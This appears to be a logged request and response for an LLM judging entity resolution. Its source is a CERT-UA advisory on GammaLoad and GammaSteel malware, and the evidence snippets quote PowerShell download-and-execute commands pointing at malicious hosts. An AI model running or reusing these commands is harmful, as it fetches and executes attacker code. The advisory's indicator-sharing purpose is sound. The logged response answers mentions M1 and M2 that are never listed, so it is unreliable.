=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
M3. "HarvesterX" (Software) — options: E17, E18, E19, E11 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E2, E24, E25, E26 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E36, E37, E38, E39
M6. "atlantar.ru" (Domain) — options: E36, E46, E39, E40
M7. "motoristo.ru" (Domain) — options: E40, E43, E50, E39 — ctx: S8
M8. "moolin.ru" (Domain) — options: E36, E37, E39, E40
M9. "bubenci.ru" (Domain) — options: E40, E37, E54, E39
M10. "callsol.ru" (Domain) — options: E36, E45, E47, E39
M11. "clipperso.ru" (Domain) — options: E40, E37, E59, E39
M12. "cooperi.ru" (Domain) — options: E36, E37, E61, E39
M13. "detroito.ru" (Domain) — options: E40, E54, E38, E39
M14. "farafauler.ru" (Domain) — options: E36, E37, E65, E39
M15. "flayga.ru" (Domain) — options: E40, E37, E38, E39 — ctx: S4
M16. "ganara.ru" (Domain) — options: E36, E72, E38, E39 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E40, E54, E39, E36
M18. "hofsteder.ru" (Domain) — options: E36, E37, E75, E39
M19. "kilitro.ru" (Domain) — options: E36, E38, E39, E40
M20. "kurapat.ru" (Domain) — options: E40, E64, E45, E39
M21. "lnasfe.ru" (Domain) — options: E36, E81, E82, E39 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E40, E60, E83, E39
M23. "mafirti.ru" (Domain) — options: E40, E55, E39, E36
M24. "metanat.ru" (Domain) — options: E40, E64, E52, E39
M25. "mitlubald.ru" (Domain) — options: E40, E77, E39, E36
M26. "paparat.ru" (Domain) — options: E40, E64, E88, E39 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E40, E37, E83, E39
M28. "qkcew.ru" (Domain) — options: E36, E37, E90, E39
M29. "rncsq.ru" (Domain) — options: E39, E37, E92, E36
M30. "tarlit.ru" (Domain) — options: E40, E64, E39, E36
M31. "tbwelo.ru" (Domain) — options: E40, E37, E43, E39
M32. "wicksl.ru" (Domain) — options: E40, E37, E73, E39
M33. "xcqef.ru" (Domain) — options: E36, E37, E78, E39
M34. "nxkad.ru" (Domain) — options: E40, E91, E77, E39 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E96, E97, E98, E99
M36. "tools.nexcess.net" (Domain) — options: E105, E106, E107, E108
M37. "viewdns.info" (Domain) — options: E111, E100, E107, E113
M38. "www.portcheckers.com" (Domain) — options: E42, E120, E50, E121 — ctx: S7

=== RESPONSE (6.6s, in 4249 / out 617 tok, STOP) ===
{"m":"M1","id":"NEW","g":"PowerShell malware for data theft"}
{"m":"M2","id":"NEW","g":".NET malware for browser credential theft"}
{"m":"M3","id":"NEW","g":"malware previously used for data harvesting"}
{"m":"M4","id":"E24","g":null}
{"m":"M5","id":"NEW","g":null}
{"m":"M6","id":"NEW","g":null}
{"m":"M7","id":"NEW","g":null}
{"m":"M8","id":"NEW","g":null}
{"m":"M9","id":"NEW","g":null}
{"m":"M10","id":"NEW","g":null}
{"m":"M11","id":"NEW","g":null}
{"m":"M12","id":"NEW","g":null}
{"m":"M13","id":"NEW","g":null}
{"m":"M14","id":"NEW","g":null}
{"m":"M15","id":"NEW","g":null}
{"m":"M16","id":"NEW","g":null}
{"m":"M17","id":"NEW","g":null}
{"m":"M18","id":"NEW","g":null}
{"m":"M19","id":"NEW","g":null}
{"m":"M20","id":"NEW","g":null}
{"m":"M21","id":"NEW","g":null}
{"m":"M22","id":"NEW","g":null}
{"m":"M23","id":"NEW","g":null}
{"m":"M24","id":"NEW","g":null}
{"m":"M25","id":"NEW","g":null}
{"m":"M26","id":"NEW","g":null}
{"m":"M27","id":"NEW","g":null}
{"m":"M28","id":"NEW","g":null}
{"m":"M29","id":"NEW","g":null}
{"m":"M30","id":"NEW","g":null}
{"m":"M31","id":"NEW","g":null}
{"m":"M32","id":"NEW","g":null}
{"m":"M33","id":"NEW","g":null}
{"m":"M34","id":"NEW","g":null}
{"m":"M35","id":"NEW","g":null}
{"m":"M36","id":"NEW","g":null}
{"m":"M37","id":"NEW","g":null}
{"m":"M38","id":"NEW","g":null}
